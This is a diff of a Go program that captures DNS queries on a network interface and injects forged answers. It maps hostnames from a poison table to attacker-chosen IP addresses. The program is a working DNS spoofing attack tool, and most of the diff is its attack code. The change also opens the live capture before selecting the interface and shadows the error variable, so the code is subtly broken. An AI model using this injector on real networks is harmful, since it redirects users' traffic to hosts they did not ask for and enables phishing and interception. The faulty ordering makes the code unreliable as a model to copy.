@@ -75,52 +75,46 @@ func main() {
 	}
 
 
-
-
-
-
-// 	// get all interfaces
-	devices, err := pcap.FindAllDevs()
-	if err != nil {
-		log.Fatal(err)
-	}
+	
 
 	var currDevice pcap.Interface
 	var handle *pcap.Handle
 
-	// Print device information
-	for _, device := range devices {
-		if iface == "" {
-			currDevice = device
-			break
-		}
-		if iface == device.Name {
-			currDevice = device
-			break
-		}
-	}
-
+	
 	// Open device
 	// handle, err = pcap.OpenLive(currDevice.Name, snapshot_len, promiscuous, timeout)
-	// if fileName != "" {
-	// 	fmt.Println("Opening file: ", fileName)
-	// 	handle, err = pcap.OpenOffline(fileName)
-	// } else {
-	// 	fmt.Println("Opening live connection on interface: ", currDevice.Name)
-	// 	handle, err = pcap.OpenLive(currDevice.Name, 1024, true, 30)
-	// }
+	if fileName != "" {
+		fmt.Println("Opening file: ", fileName)
+		handle, err = pcap.OpenOffline(fileName)
+	} else {
+		fmt.Println("Opening live connection on interface: ", currDevice.Name)
+		handle, err = pcap.OpenLive(currDevice.Name, 1024, true, 30)
 
-	handle, err = pcap.OpenLive(currDevice.Name, 1024, true, 30)
+		devices, err := pcap.FindAllDevs()
+		if err != nil {
+			log.Fatal(err)
+		}
+		// Print device information
+		for _, device := range devices {
+			if iface == "" {
+				currDevice = device
+				break
+			}
+			if iface == device.Name {
+				currDevice = device
+				break
+			}
+		}
+
+	}
+
+	// handle, err = pcap.OpenLive(currDevice.Name, 1024, true, 30)
 
 	if err != nil {
 		log.Fatal(err)
 	}
 
 	defer handle.Close()
-
-	// handle.SetBPFFilter(pattern)
-	// handle.SetBPFFilter(actualBpfFilter)
-
 
 	if actualBpfFilter == "" {
 		actualBpfFilter = "udp and port 53"
@@ -132,58 +126,14 @@ func main() {
 		}
 	}
 
-
 	// Use the handle as a packet source to process all packets
 	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
 	for packet := range packetSource.Packets() {
 		fmt.Println("!!!! New packet received !!!!")
-		// fmt.Println(packet)
 		dns_spoof(handle, packet, poisonHostsTable)
-		/*if (pattern=="") {
-			// generateOutputForPacket(packet)
-			dns_spoof(handle, packet)
-		} else if (strings.Contains(string(packet.Data()), pattern)) {
-			// generateOutputForPacket(packet)
-			dns_spoof(handle, packet)
-		}*/
 	}
 
 }
-
-// /*
-
-// Extract the following from read packet:
-
-// Ethernet layer:
-// SrcMAC
-// DstMAC
-// EthernetType
-
-// IP layer:
-// Version
-// TTL
-// SrcIP
-// DstIP
-// protocol
-
-// UDP layer:
-// SrcPort
-// DstPort
-
-
-
-// DNS layer:
-// Just use the exact same layer from the request packet
-
-// TXID
-
-
-// */
-
-
-
-
-
 
 
 func dns_spoof(handle *pcap.Handle, packet gopacket.Packet, poisonHostsTable map[string]string) {
@@ -221,20 +171,20 @@ func dns_spoof(handle *pcap.Handle, packet gopacket.Packet, poisonHostsTable map
 		destPort = udpPacket.DstPort
 	}
 
-	fmt.Println("=========================================================")
+	// fmt.Println("=========================================================")
 	dnsLayer := packet.Layer(layers.LayerTypeDNS)
     if dnsLayer != nil {
         dns, _ := dnsLayer.(*layers.DNS)
 		// Dns Operations
 		// dns_id = dnsPacket.ID
 		// fmt.Print("dns_id: ", dns_id)
-		fmt.Println("————————-------------------------------------------------")
+		// fmt.Println("————————-------------------------------------------------")
 		// var buf []byte
-		fmt.Println("DNS ", dns.ID)
+		// fmt.Println("DNS ", dns.ID)
 		writePacket := false
 		if dns.ANCount == 0 {
-			fmt.Println("————————")
-			fmt.Println("    DNS Record Detected")
+			// fmt.Println("————————")
+			// fmt.Println("    DNS Record Detected")
 			for _, dnsQuestion := range dns.Questions {
 				website := string(dnsQuestion.Name)
 
@@ -273,7 +223,7 @@ func dns_spoof(handle *pcap.Handle, packet gopacket.Packet, poisonHostsTable map
 		}
 
 		if writePacket {
-			fmt.Println("=========================================================")
+			// fmt.Println("=========================================================")
 
 			eth := layers.Ethernet {
 				SrcMAC:       destMacAddr,
@@ -301,70 +251,12 @@ func dns_spoof(handle *pcap.Handle, packet gopacket.Packet, poisonHostsTable map
 			gopacket.SerializeLayers(buf, opts, &eth, &ip, &udp, &*dns)
 			finalPacket := buf.Bytes()
 			if err := handle.WritePacketData(finalPacket); err != nil {
-				// return err
 				fmt.Println("Error sending spoofed packet:", err)
 			}
-			// return nil
 		}
 
 	}
 
 }
 
-
-// func (ogPacket originalPacketDetails) prepareSpoofedResponse(dns *layers.DNS, cDetails poisonCommandDetails) *layers.DNS {
-//     // fmt.Println("In spoof function ", cDetails)
-//     // fmt.Println("DNS:", dns)
-//     fmt.Println("————————-------------------------------------------------")
-//     // var buf []byte
-//     fmt.Println("DNS ", dns.ID)
-//     writePacket := false
-//     var websiteAtIndex int
-//     if dns.ANCount == 0 {
-//         fmt.Println("————————")
-//         fmt.Println("    DNS Record Detected")
-//         for _, dnsQuestion := range dns.Questions {
-//             website := string(dnsQuestion.Name)
-//             var answerRecord layers.DNSResourceRecord
-//             if cDetails.hostfile != "" {
-//                 websiteAtIndex = contains(cDetails.websiteNames, website)
-//                 // fmt.Print("Website Found at index: ", websiteAtIndex)
-//                 if websiteAtIndex == -1 {
-//                     continue
-//                 }
-//             } else {
-//                 websiteAtIndex = 0 //default
-//             }
-//             writePacket = true
-//             spoofedIp := net.ParseIP(cDetails.redirectLocations[websiteAtIndex])
-//             fmt.Print("Spoofed IP: ", spoofedIp)
-//             answerRecord.IP = spoofedIp
-//             dns.ANCount += 1
-//             answerRecord.Type = layers.DNSTypeA
-//             answerRecord.Name = []byte(dnsQuestion.Name)
-//             answerRecord.Class = layers.DNSClassIN
-//             dns.QR = true
-//             dns.OpCode = layers.DNSOpCodeNotify
-//             dns.AA = true
-//             dns.Answers = append(dns.Answers, answerRecord)
-//             dns.ResponseCode = layers.DNSResponseCodeNoErr
-//             if dns.ANCount > 0 {
-//                 for _, dnsAnswer := range dns.Answers {
-//                     // fmt.Println("All DNS Answers: ", dnsAnswer.String())
-//                     // d.DnsAnswerTTL = append(d.DnsAnswerTTL, fmt.Sprint(dnsAnswer.TTL))
-//                     if dnsAnswer.IP.String() != "<nil>" {
-//                         // fmt.Println("    DNS Answer: ", dnsAnswer.IP.String())
-//                         // d.DnsAnswer = append(d.DnsAnswer, dnsAnswer.IP.String())
-//                     }
-//                 }
-//             }
-//             // }
-//         }
-//     }
-//     if writePacket {
-//         return dns
-//     } else {
-//         return nil
-//     }
-// }
 
